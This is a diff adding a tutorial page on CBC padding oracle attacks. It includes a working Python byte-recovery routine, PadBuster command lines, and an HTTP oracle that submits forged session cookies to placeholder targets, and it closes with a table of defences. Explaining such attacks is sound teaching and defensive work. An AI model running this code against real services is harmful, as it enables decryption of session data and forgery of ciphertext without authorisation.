@@ -1,0 +1,179 @@
+---
+title: "Padding Oracle Attacks"
+description: "How CBC padding oracle attacks work, step-by-step byte recovery, encryption forgery, practical tooling with PadBuster, and defences."
+---
+
+A **padding oracle attack** is one of the most powerful adaptive chosen-ciphertext attacks in practical cryptography. Given a system that tells you whether a decrypted ciphertext has valid PKCS#7 padding, you can:
+
+1. **Decrypt any ciphertext** without knowing the key
+2. **Encrypt any chosen plaintext** (forge ciphertext)
+
+The oracle can be as subtle as a different HTTP error code, a longer response, or a measurable timing difference.
+
+## Prerequisites
+
+- Target uses AES-CBC (or another CBC mode cipher) with PKCS#7 padding
+- The system exposes a padding validity signal after decryption:
+  - Different HTTP status codes (`200 OK` vs `500 Internal Server Error`)
+  - Different response bodies ("Invalid padding" vs "Incorrect MAC")
+  - Timing difference between valid and invalid padding
+
+## How the attack works
+
+### CBC decryption reminder
+
+```text
+P[i] = Decrypt(C[i]) XOR C[i-1]
+```
+
+Let `D[i] = Decrypt(C[i])` (the raw block cipher output). Then:
+
+```text
+P[i] = D[i] XOR C[i-1]
+```
+
+An attacker who controls `C[i-1]` (the previous ciphertext block) and can query the oracle controls what `P[i]` decrypts to.
+
+### Recovering one byte
+
+To recover the **last byte** of `P[i]`:
+
+1. Send a modified ciphertext where the last byte of `C[i-1]` is replaced with a guess `g`.
+2. If the oracle returns "valid padding", the last byte of `P[i]` is `\x01` (single-byte valid PKCS#7).
+3. Therefore: `D[i][15] XOR g = 0x01`, so `D[i][15] = g XOR 0x01`.
+4. Recover the original plaintext byte: `P[i][15] = D[i][15] XOR C[i-1][15]`.
+
+### Recovering the full block
+
+Repeat for each byte position, right to left. For position `j` (counting from the right, starting at 1):
+
+1. Fix all previously recovered bytes: set them so they decrypt to the target padding value `j`.
+2. Brute-force the next byte until the oracle signals valid padding.
+
+```python
+def padding_oracle_decrypt(oracle, ciphertext: bytes, block_size: int = 16) -> bytes:
+    """Decrypt ciphertext using a padding oracle.
+    oracle(ct) -> True if padding is valid.
+    """
+    plaintext = b''
+    blocks = [ciphertext[i:i+block_size]
+              for i in range(0, len(ciphertext), block_size)]
+
+    for block_idx in range(1, len(blocks)):
+        intermediate = bytearray(block_size)  # D[block_idx]
+        prev_block   = bytearray(blocks[block_idx - 1])
+        cur_block    = blocks[block_idx]
+
+        for byte_pos in range(block_size - 1, -1, -1):
+            pad_byte = block_size - byte_pos  # target padding value
+            # Fix known bytes to produce target padding
+            modified_prev = bytearray(prev_block)
+            for k in range(byte_pos + 1, block_size):
+                modified_prev[k] = intermediate[k] ^ pad_byte
+
+            # Brute-force the current byte
+            for guess in range(256):
+                modified_prev[byte_pos] = guess
+                test_ct = bytes(modified_prev) + cur_block
+                if oracle(test_ct):
+                    # Found valid padding
+                    intermediate[byte_pos] = guess ^ pad_byte
+                    break
+
+        # Recover plaintext block
+        plaintext += bytes(a ^ b for a, b in zip(intermediate, prev_block))
+
+    # Strip PKCS#7 padding from the result
+    return plaintext[:-plaintext[-1]]
+```
+
+<Warning>
+The above is a simplified single-threaded implementation. Real attacks need to handle the edge case where `\x01` padding is accidentally valid due to a coincidental `\x02\x02` at the end. Production tools handle this by verifying `\x02\x02` explicitly.
+</Warning>
+
+## Encryption forgery
+
+By reversing the decryption process you can also **encrypt** arbitrary plaintext:
+
+1. Choose a target plaintext `P'` and pad it.
+2. Starting from the last block and working backwards, determine the `C[i-1]` values that will produce valid decrypted `P'[i]`.
+3. The final computed `C[-1]` becomes the IV.
+
+This allows you to forge entirely new ciphertext without knowing the key.
+
+## Practical tooling
+
+### PadBuster
+
+[PadBuster](https://github.com/AonCyberLabs/PadBuster) automates the attack against web targets.
+
+```bash
+# Decrypt a Base64-encoded cookie
+perl padBuster.pl http://target.com/login \
+  "RVJDQrwUdTRWJUVUeBKkEA==" \
+  16 \
+  -encoding 0 \
+  -cookies "session=RVJDQrwUdTRWJUVUeBKkEA=="
+
+# Flags:
+# 16       = block size (always 16 for AES)
+# -encoding 0 = Base64
+# -error "padding" = use a specific string to identify the oracle response
+```
+
+### padbuster (Python)
+
+```bash
+pip install padbuster
+padbuster --url "http://target/login" \
+          --ciphertext "<hex_ciphertext>" \
+          --block-size 16
+```
+
+### Manual exploit with pycryptodome
+
+```python
+import requests
+
+def oracle(ciphertext: bytes) -> bool:
+    """Returns True if the server accepts the padding."""
+    import base64
+    ct_b64 = base64.b64encode(ciphertext).decode()
+    resp = requests.get(
+        'http://target/decrypt',
+        cookies={'session': ct_b64}
+    )
+    return resp.status_code != 500   # 500 = padding error
+
+# Use padding_oracle_decrypt() from above
+plaintext = padding_oracle_decrypt(oracle, original_ciphertext)
+print(plaintext)
+```
+
+## Real-world examples
+
+<AccordionGroup>
+  <Accordion title="POODLE — SSLv3 CBC padding oracle (CVE-2014-3566)">
+    SSLv3 uses a non-deterministic padding scheme and performs MAC-then-encrypt. An attacker who can inject chosen blocks into a TLS session can exploit the padding validation to recover plaintext cookies, one byte at a time (256 requests per byte on average).
+
+    Mitigation: disable SSLv3 and TLS 1.0; use TLS 1.2+ with AEAD ciphers.
+  </Accordion>
+  <Accordion title="ASP.NET ViewState padding oracle (2010, MS10-070)">
+    ASP.NET encrypted ViewState with AES-CBC and returned a generic error page when padding was invalid. Researchers demonstrated full decryption and code execution via crafted ViewState tokens.
+
+    Mitigation: Microsoft added a `customErrors` requirement and later deprecated CBC-based ViewState encryption.
+  </Accordion>
+</AccordionGroup>
+
+## Performance
+
+For a 16-byte AES block, the worst case is 256 queries per byte × 16 bytes = **4096 queries per block**. In practice the average is ~128 per byte, or ~2048 per block. Multi-threading or binary search on the oracle can significantly reduce this.
+
+## Defences
+
+| Defence | Notes |
+|---|---|
+| **Use AEAD** (AES-GCM, ChaCha20-Poly1305) | Integrity check prevents oracle queries from being useful |
+| **Constant-time padding check** | Removes timing oracle; check MAC first, padding second |
+| **Encrypt-then-MAC** | MAC is verified before decryption — invalid ciphertexts are rejected before padding is checked |
+| **Uniform error responses** | Never distinguish padding errors from MAC errors in server responses |
